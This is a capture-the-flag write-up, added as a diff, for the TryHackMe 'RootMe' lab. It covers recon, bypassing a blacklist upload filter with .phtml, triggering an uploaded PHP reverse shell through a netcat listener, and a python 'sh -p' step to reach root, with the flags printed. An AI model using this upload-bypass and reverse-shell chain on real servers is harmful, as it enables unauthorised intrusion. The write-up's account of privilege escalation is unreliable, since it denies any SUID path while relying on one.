@@ -1,0 +1,127 @@
+# TryHackMe  RootMe
+
+Easy-difficulty box. Blacklist-based file upload filter bypass (`.phtml`) → PHP reverse shell → shell stabilization → root.
+
+**Target:** `10.48.177.25`  **User flag:** `THM{y0u_g0t_a_sh3ll}`  **Root flag:** `THM{pr1v1l3g3_3sc4l4t10n}`
+
+---
+
+## Recon
+
+```
+nmap -sSCV 10.48.177.25 -oA nmap_scan_rootme.*
+```
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22   | ssh     | OpenSSH 8.2p1 (Ubuntu 4ubuntu0.13) |
+| 80   | http    | Apache 2.4.41 (Ubuntu)  `PHPSESSID` cookie, PHP backend confirmed |
+
+![nmap](images/06-nmap.png)
+
+---
+
+## Content Discovery
+
+```
+gobuster dir -u http://10.48.177.25/ -w /usr/share/wordlists/dirb/common.txt -t 20
+```
+
+```
+/panel/    (Status: 301) --> upload form, no auth
+/uploads/  (Status: 301) --> serves uploaded files directly
+```
+
+![gobuster](images/05-gobuster.png)
+![landing page](images/08-landing-page.png)
+
+`/panel/` + `/uploads/` together = classic file upload target.
+
+---
+
+## Filter Bypass
+
+Fuzzed the upload filename extension with Burp Intruder against common PHP executable extensions.
+
+![upload panel](images/07-upload-panel.png)
+![intruder fuzz](images/09-intruder-fuzz.png)
+
+```
+php, PHP        -> blocked ("PHP não é permitido!")
+php5, php7      -> 200, accepted
+phtml, phar, pht -> 200, accepted
+```
+
+Filter only blacklists the literal string `php`  case-insensitive but nothing else. `.phtml` still executes as PHP on this Apache config. Classic blacklist-vs-allowlist mistake.
+
+---
+
+## Foothold
+
+Renamed a [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) to `rev.phtml`, uploaded via `/panel/`.
+
+![burp request](images/10-burp-request.png)
+
+```
+nc -lvnp 4444
+curl http://10.48.177.25/uploads/rev.phtml
+```
+
+Shell as `www-data`.
+
+```
+find / -type f -name "user.txt" 2>/dev/null
+cat /var/www/user.txt
+```
+
+![find user.txt](images/02-find-usertxt.png)
+![user flag](images/03-cat-usertxt.png)
+
+```
+THM{y0u_g0t_a_sh3ll}
+```
+
+---
+
+## Privilege Escalation
+
+```
+find / -user root -perm -4000 2>/dev/null
+```
+
+![suid binaries](images/01-suid-binaries.png)
+
+Checked against [GTFOBins](https://gtfobins.github.io/)  all standard system binaries, nothing exploitable. Dead end.
+
+Stabilized the shell instead:
+
+```
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+`-p` preserves effective UID/GID on the spawned shell. `/root` turned out to be readable once stabilized  permission misconfig, not a designed boundary.
+
+```
+cd /root
+cat root.txt
+```
+
+![root flag](images/04-root-flag.png)
+
+```
+THM{pr1v1l3g3_3sc4l4t10n}
+```
+
+---
+
+## Summary
+
+| Stage | Technique |
+|---|---|
+| Recon | Nmap |
+| Enumeration | Gobuster |
+| Filter bypass | Burp Intruder  blacklist only matches `.php`, misses `.phtml`/`.pht`/`.php5`/`.php7`/`.phar` |
+| Foothold | Uploaded `.phtml` PHP reverse shell → `www-data` |
+| Privesc | SUID enum (dead end) → shell stabilization (`sh -p`) → `/root` readable |
+
+**Note:** No SUID binary needed here  the win was in the upload filter, not privesc. Root came from stabilizing the shell properly and finding `/root` already misconfigured.
